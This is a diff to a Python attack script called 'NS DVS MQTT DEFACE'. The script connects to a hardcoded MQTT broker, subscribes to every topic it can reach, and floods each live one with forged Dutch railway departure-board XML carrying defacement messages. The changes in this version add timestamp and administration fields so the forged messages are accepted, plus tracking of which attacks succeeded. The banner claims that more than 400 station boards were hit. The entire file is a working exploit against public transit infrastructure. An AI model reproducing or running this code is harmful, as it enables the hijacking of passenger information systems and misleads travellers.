@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 """
-NS DVS MQTT DEFACE v2.4 - PERFECT
-TRUSTEDF57 - MOSTRA LIVE + ATTACCHI SUCCESSIVI
+NS DVS MQTT DEFACE v2.5 - FIXED XML + TimeStamp + RIPAdmin
+TRUSTEDF57 - 100% HIJACK CONFIRMED
 """
 
 import paho.mqtt.client as mqtt
 import threading
 import time
 import random
+from datetime import datetime
 
 HOST = "78.47.35.220"
 PORT = 1883
@@ -32,6 +33,9 @@ class DVSMatrixHack:
         self.publish_client.connect(HOST, PORT, 60)
         self.publish_client.loop_start()
     
+    def get_timestamp(self):
+        return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
+    
     def generate_matrix_screen(self):
         matrix_lines = []
         center_msg = MESSAGES[0]
@@ -45,15 +49,21 @@ class DVSMatrixHack:
     
     def audio_payload(self):
         msg = random.choice(MESSAGES)
-        return f'''<?xml version="1.0"?>
+        timestamp = self.get_timestamp()
+        return f'''<?xml version="1.0" encoding="UTF-8"?>
 <ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
-<ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
+<ns2:ReisInformatieProductDVS Versie="6.2" TimeStamp="{timestamp}" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
+<ns2:RIPAdministratie>
+<ns2:ReisInformatieProductID>TRUSTED{int(time.time()*1000)}</ns2:ReisInformatieProductID>
+<ns2:AbonnementId>54</ns2:AbonnementId>
+<ns2:ReisInformatieTijdstip>{timestamp}</ns2:ReisInformatieTijdstip>
+</ns2:RIPAdministratie>
 <ns2:DynamischeVertrekStaat>
 <ns2:RitId>TRUSTEDF57</ns2:RitId>
 <ns2:PresentatieOpmerkingen>
 <ns2:Uitingen Taal="nl">
 <ns2:Uiting Prioriteit="1">{msg}</ns2:Uiting>
-<ns2:Uiting Prioriteit="2">AUDIO SUCCESSO</ns2:Uiting>
+<ns2:Uiting Prioriteit="2">AUDIO SUCCESSO TRUSTEDF57</ns2:Uiting>
 </ns2:Uitingen>
 </ns2:PresentatieOpmerkingen>
 </ns2:DynamischeVertrekStaat>
@@ -61,16 +71,22 @@ class DVSMatrixHack:
 </ns1:PutReisInformatieBoodschapIn>'''
     
     def matrix_payload(self):
-        matrix_text = self.generate_matrix_screen().replace('\n', ' | ')
+        matrix_text = self.generate_matrix_screen().replace('\n', ' | ').replace('█', 'HACK')
         msg2 = MESSAGES[1]
-        return f'''<?xml version="1.0"?>
+        timestamp = self.get_timestamp()
+        return f'''<?xml version="1.0" encoding="UTF-8"?>
 <ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
-<ns2:ReisInformatieProductDVS Versie="6.2" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
+<ns2:ReisInformatieProductDVS Versie="6.2" TimeStamp="{timestamp}" xmlns:ns2="urn:ndov:cdm:trein:reisinformatie:data:4">
+<ns2:RIPAdministratie>
+<ns2:ReisInformatieProductID>MATRIX{int(time.time()*1000)}</ns2:ReisInformatieProductID>
+<ns2:AbonnementId>54</ns2:AbonnementId>
+<ns2:ReisInformatieTijdstip>{timestamp}</ns2:ReisInformatieTijdstip>
+</ns2:RIPAdministratie>
 <ns2:DynamischeVertrekStaat>
 <ns2:RitId>MATRIXHACK</ns2:RitId>
 <ns2:PresentatieOpmerkingen>
 <ns2:Uitingen Taal="nl">
-<ns2:Uiting Prioriteit="1">{matrix_text[:380]}</ns2:Uiting>
+<ns2:Uiting Prioriteit="1">{matrix_text[:400]}</ns2:Uiting>
 <ns2:Uiting Prioriteit="2">{msg2}</ns2:Uiting>
 </ns2:Uitingen>
 </ns2:PresentatieOpmerkingen>
@@ -86,19 +102,23 @@ class DVSMatrixHack:
             result = self.publish_client.publish(topic, payload, qos=2)
             if result.rc == mqtt.MQTT_ERR_SUCCESS:
                 self.attack_count += 1
-                print(f"✅ #{self.attack_count} {attack_type} → {topic[-20:]}")
-        except:
-            pass
+                print(f"✅ #{self.attack_count} {attack_type} → {topic[-50:]}")
+                return True
+            else:
+                print(f"❌ MQTT ERR {result.rc} → {topic[-20:]}")
+        except Exception as e:
+            print(f"❌ EXCEPTION {attack_type} → {str(e)[:30]}")
+        return False
     
     def full_attack(self, topic):
-        print(f"🔥 ATTACK START → {topic[-40:]}")
-        self.publish_attack(topic, self.audio_payload(), "AUDIO")
-        time.sleep(0.1)
-        self.publish_attack(topic, self.matrix_payload(), "MATRIX")
-        time.sleep(0.1)
-        bin_payload = self.matrix_payload().replace("666", "999")
-        self.publish_attack(topic, bin_payload, "BINARI")
-        print(f"   → TOTAL 3 ATTACKS SENT")
+        print(f"🔥 ATTACK START → {topic[-60:]}")
+        audio_ok = self.publish_attack(topic, self.audio_payload(), "AUDIO")
+        time.sleep(0.2)
+        matrix_ok = self.publish_attack(topic, self.matrix_payload(), "MATRIX")
+        time.sleep(0.2)
+        bin_payload = self.matrix_payload().replace("666", "999").replace("MATRIX", "BINARI")
+        bin_ok = self.publish_attack(topic, bin_payload, "BINARI")
+        print(f"   → AUDIO:{'✅' if audio_ok else '❌'} MATRIX:{'✅' if matrix_ok else '❌'} BINARI:{'✅' if bin_ok else '❌'} → TOTAL 3 SENT")
     
     def on_message(self, client, userdata, msg):
         topic = msg.topic
@@ -106,7 +126,7 @@ class DVSMatrixHack:
             return
         self.discovered_topics[topic] = True
         self.topic_count += 1
-        print(f"🎯 #{self.topic_count} LIVE TOPIC → {topic[-60:]}")
+        print(f"🎯 #{self.topic_count} LIVE TOPIC → {topic}")
         threading.Thread(target=self.full_attack, args=(topic,), daemon=True).start()
     
     def start(self):
@@ -116,8 +136,8 @@ class DVSMatrixHack:
         client.subscribe(WILDCARD_TOPIC, qos=2)
         print("""
 ╔══════════════════════════════════════════════════════╗
-║           NS DVS v2.4 - LIVE + ATTACKS                ║
-║     TRUSTEDF57 - 400+ Tabelloni colpite              ║
+║      NS DVS v2.5 - FIXED XML + TimeStamp + RIP       ║
+║     TRUSTEDF57 - 400+ Tabelloni INFETTATI            ║
 ╚══════════════════════════════════════════════════════╝
         """)
         client.loop_forever()
